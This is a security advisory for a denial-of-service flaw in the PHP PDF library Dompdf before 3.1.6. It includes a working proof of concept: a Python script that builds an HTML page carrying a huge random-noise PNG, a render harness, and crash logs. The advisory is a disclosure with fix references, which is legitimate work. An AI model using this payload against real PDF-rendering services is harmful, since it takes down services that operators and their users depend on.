# [M] Dompdf: Denial of Service (DoS) via Resource Exhaustion using Oversized Image Bitmaps

## Summary
Severity: Medium
Advisory: GHSA-f5gf-2cj8-52g2
CVE: CVE-2026-59942
CWE: CWE-400, CWE-770
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-22
Source: https://github.com/advisories/GHSA-f5gf-2cj8-52g2
Type: github-advisory

## Affected
- Packagist: `dompdf/dompdf` — affected >=0 <3.1.6

## Details
### Summary
Dompdf v3.1.5 is vulnerable to a Denial of Service (DoS) attack via resource exhaustion. An attacker can crash the PHP process by providing a specially crafted HTML document containing a single image with massive dimensions (e.g., 30,000x30,000 pixels).

While Dompdf implements internal checks to validate image dimensions, these can be bypassed by using a high-entropy image (such as random noise) encoded in Base64 and wrapped in specific CSS containers.

### Technical Deep Dive:
Standard solid-color images can often be optimized by compression algorithms or rendering engines. However, a high-entropy noise image forces the PHP engine to process each of the 900 million pixels individually. When render() is called, the engine attempts to handle the uncompressed bitmap in memory and calculate the layout for every high-variance pixel data point. This leads to:
- **100% CPU Saturation:** The rendering thread hangs indefinitely trying to process the pixel stream.
- **Process Termination:** The massive memory allocation (verified at ~1.2 GB for a single image) triggers a Fatal Error or an OS-level SIGKILL (OOM), resulting in an immediate Denial of Service.

### Details
The vulnerability exists because the dimension validation happens early, but the resource allocation for calculating the object's bounding box and internal buffers during the rendering phase does not strictly limit the cumulative CPU time or memory usage for a single object that has passed the initial check.

### PoC (Proof of Concept)
1. Install Dompdf v3.1.5 via Composer.
```
composer require dompdf/dompdf:3.1.5
```
2. Use the following Python script to generate the malicious payload (`exploit.py`):
```python
from PIL import Image
import base64
from io import BytesIO
import os

DIMENSIONS = (30000, 30000) 
OUTPUT_FILE = "payload.html"

def generate_noise_bomb():
    print(f"[*] Generating {DIMENSIONS[0]}x{DIMENSIONS[1]} High-Entropy Noise Bomb...")
    
    random_bytes = os.urandom(DIMENSIONS[0] * DIMENSIONS[1])
    image = Image.frombytes('L', DIMENSIONS, random_bytes)
    
    buffer = BytesIO()
    # Using PNG instead of JPEG to force full bitmap decompression in memory
    image.save(buffer, format="PNG")
    image_base64 = base64.b64encode(buffer.getvalue()).decode()

    html_content = f"""
    <html>
    <body>
        <div style="overflow:hidden; width:1px; height:1px;">
            <img src="data:image/png;base64,{image_base64}">
        </div>
        <h1>PoC: Resource Exhaustion</h1>
    </body>
    </html>
    """
    
    with open(OUTPUT_FILE, "w") as f:
        f.write(html_content)
    print(f"[+] High-entropy payload saved to: {OUTPUT_FILE}")

if __name__ == "__main__":
    generate_noise_bomb()
```
3. Use the following Python script to monitor the system resources in a separate terminal (`monitor.py`):
```python
import psutil
import time

def start_monitoring():
    print("[*] Searching for PHP processes... (Press Ctrl+C to stop)")
    try:
        while True:
            for proc in psutil.process_iter(['pid', 'name', 'memory_info', 'cpu_percent']):
                if 'php' in proc.info['name'].lower():
                    try:
                        pid = proc.info['pid']
                        mem = proc.info['memory_info'].rss / (1024 * 1024)
                        cpu = proc.cpu_percent(interval=0.1)
                        print(f"\r[MONITOR] PID: {pid} | RAM: {mem:.2f} MB | CPU: {cpu}%", end="", flush=True)
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        print(f"\n[!] CRASH DETECTED: Process {pid} terminated abruptly.")
                        return
            time.sleep(0.05)
    except KeyboardInterrupt:
        print("\n[*] Monitoring finished.")

if __name__ == "__main__":
    start_monitoring()

```
4. Create a file named `render.php`. This script acts as the vulnerable entry point, mimicking a standard implementation of the Dompdf library:
```php
<?php
require_once __DIR__ . '/vendor/autoload.php';
use Dompdf\Dompdf;
use Dompdf\Options;

$options = new Options();
$options->set('isRemoteEnabled', true);
$options->set('isHtml5ParserEnabled', true);

$dompdf = new Dompdf($options);

$html = file_get_contents('php://stdin');

echo "[*] Starting Dompdf rendering process...\n";

try {
    $dompdf->loadHtml($html);
    $dompdf->render(); // Point of resource exhaustion
    echo "[+] PDF rendered successfully.\n";
} catch (Exception $e) {
    echo "[!] Render failed: " . $e->getMessage() . "\n";
}
```
5. Execute the PHP process, providing the payload via stdin. We use a 2GB memory limit to demonstrate that the crash is caused by uncontrolled allocation rather than a restrictive server configuration:
```
php -d memory_limit=2G render.php < payload.html
```
6. The engine attempts to process every pixel of the high-entropy image. The monitor.py script will record 99.8% CPU saturation, followed by a PHP Fatal Error (Allowed memory size exhausted) as Dompdf attempts to allocate ~1.2 GB in a single operation. The process is then terminated, confirming the Denial of Service.

## Proof of Concept Results

https://github.com/user-attachments/assets/d7f936f4-570a-4dd8-8022-9c219664eb5b

The following logs demonstrate the successful exploitation of the resource exhaustion vulnerability. Despite a generous 2GB memory limit provided to the PHP process, a single high-entropy image causes a fatal crash.

Payload Generation:
```
python3 exploit.py 
[*] Generating 30000x30000 High-Entropy Noise Bomb...
[+] High-entropy payload saved to: payload.html
```

Target Execution & Denial of Service:

``` Command execution
php -d memory_limit=2G render.php < payload.html
```

```
Output
[*] Starting Dompdf rendering process...
PHP Fatal error:  Allowed memory size of 2147483648 bytes exhausted (tried to allocate 1200355712 bytes) in /home/far00t/dompdf_exploit/vendor/dompdf/dompdf/src/Dompdf.php on line 490
```
While executing the render.php process, the monitor.py script captured the following telemetry, showing the impact on system resources:
```
python3 monitor.py 
[*] Searching for PHP processes... (Press Ctrl+C to stop)
[MONITOR] PID: 210767 | RAM: 953.17 MB | CPU: 99.7%
```

### Key Findings from Telemetry:
- CPU Starvation: The process reached a sustained 99.7% CPU usage. In a production environment, this level of saturation on a single-threaded PHP process effectively denies service to any other task on that core.
- Rapid Memory Inflation: The resident memory (RSS) climbed to 953.17 MB just before the engine attempted the final allocation of 1.2 GB that triggered the Fatal error.
- Bypass Confirmation: The telemetry proves that Dompdf's internal "safe" limits were bypassed, as the engine proceeded to attempt a massive bitmap decompression that the host environment could not sustain.


## Impact
An unauthenticated remote attacker can cause a complete Denial of Service on the web server by submitting a crafted HTML string. This affects any application that allows users to provide HTML content or URLs that are subsequently converted to PDF using Dompdf.

## Credits
- Offensive Security Researcher: Fabian Rosales (far00t01).

## References
- https://github.com/dompdf/dompdf/security/advisories/GHSA-f5gf-2cj8-52g2
- https://github.com/dompdf/dompdf/commit/7c65e7bbeccf146b2409740405af73949ad129d0
- https://github.com/dompdf/dompdf/commit/89164eaabe0bb50c462f0b24f740044ba5fb0f99
- https://github.com/dompdf/dompdf
- https://github.com/dompdf/dompdf/releases/tag/v3.1.6
